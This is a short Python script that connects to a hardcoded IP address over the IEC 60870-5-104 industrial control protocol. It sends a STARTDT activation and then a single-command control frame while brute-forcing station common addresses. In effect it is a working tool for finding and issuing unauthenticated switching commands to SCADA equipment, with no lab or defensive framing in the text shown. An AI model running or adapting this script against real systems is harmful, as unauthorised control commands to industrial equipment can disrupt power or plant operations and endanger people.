#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    for ca_val in [0, 1, 2, 255, 256, 65535]:
        s = socket.socket()
        s.settimeout(30)
        try:
            s.connect((HOST, PORT))
            s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
            time.sleep(2)
            r = s.recv(1024)
            if not r or r[0] != 0x68:
                print(f'CA {ca_val}: no startdt')
                continue
            ca = bytes([ca_val & 0xFF, (ca_val >> 8) & 0xFF])
            tx = rx = 0
            def send_i(asdu):
                nonlocal tx, rx
                apci = bytes([0x68, len(asdu)+4, tx&0xFF,(tx>>8)&0xFF, rx&0xFF,(rx>>8)&0xFF])
                tx += 2; rx += 2
                s.send(apci+asdu)
            ioa = bytes([0x01,0x00,0x00])
            asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x81])
            send_i(asdu)
            time.sleep(3)
            try:
                r2 = s.recv(1024)
                print(f'CA {ca_val}: {r2.hex() if r2 else "none"}')
            except:
                print(f'CA {ca_val}: timeout')
            s.close()
            time.sleep(2)
        except Exception as e:
            print(f'CA {ca_val}: err {e}')
            try: s.close()
            except: pass

if __name__ == '__main__':
    main()
